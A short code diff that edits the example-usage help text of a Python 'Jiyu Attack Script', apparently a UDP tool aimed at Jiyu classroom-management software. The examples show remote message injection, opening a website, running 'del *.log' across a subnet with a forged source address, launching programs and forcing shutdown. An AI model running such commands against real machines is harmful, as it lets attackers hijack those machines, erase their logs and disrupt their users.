@@ -80,9 +80,9 @@ if __name__ == "__main__":
         description="Jiyu Attack Script",
         epilog="Github Repositories: https://github.com/weilycoder/Jiyu_udp_attack/tree/main/ \n \n"
         "Example usage:\n"
-        '    python Jiyu_udp_attack -t 192.168.106.100 -m "Hello World" -i 1000\n'
+        '    python Jiyu_udp_attack -t 192.168.106.100 -m "Hello World"\n'
         "    python Jiyu_udp_attack -t 192.168.106.104 -w https://www.github.com\n"
-        '    python Jiyu_udp_attack -t 192.168.106.0/24 -f 192.168.106.2 -c "del *.log"\n'
+        '    python Jiyu_udp_attack -t 192.168.106.0/24 -f 192.168.106.2 -c "del *.log" -i 1000\n'
         "    python Jiyu_udp_attack -t 224.50.50.42 -e calc.exe\n"
         "    python Jiyu_udp_attack -t 224.50.50.42 --maximize-execute notepad.exe\n"
         '    python Jiyu_udp_attack -t 224.50.50.42 -s 60 "System is going to shutdown."\n'
